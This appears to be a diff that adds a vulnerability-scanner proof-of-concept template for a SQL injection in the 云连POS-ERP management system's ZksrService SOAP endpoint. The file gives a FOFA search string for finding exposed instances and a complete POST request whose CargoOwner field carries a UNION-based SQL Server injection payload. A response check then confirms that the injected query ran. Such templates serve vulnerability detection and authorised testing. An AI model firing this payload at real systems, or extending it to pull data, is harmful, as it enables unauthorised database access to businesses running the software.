@@ -1,0 +1,28 @@
+id: poc-yaml-yunlian-pos-erp-zksrservice-sqli
+info:
+  name: 云连POS-ERP管理系统 ZksrService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 云连POS-ERP管理系统
+  fofa: title="Powered By chaosZ"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /services/ZksrService
+  headers:
+    SOAPAction: ''
+    Content-Type: text/xml; charset=UTF-8
+  data: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://webservice.service.chaosZ.com\">\n<soapenv:Header/>\n   \
+    \ <soapenv:Body>\n        <web:getItemInfo soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\
+    >\n            <data xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"\
+    >{\"CargoOwner\":\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL--\
+    \ qfYz\"}\n            </data>\n        </web:getItemInfo>\n    </soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"</getItemInfoReturn>") && contains(body,"0x"
+    + t2) && contains(content_type,"text/xml")
+transport: http
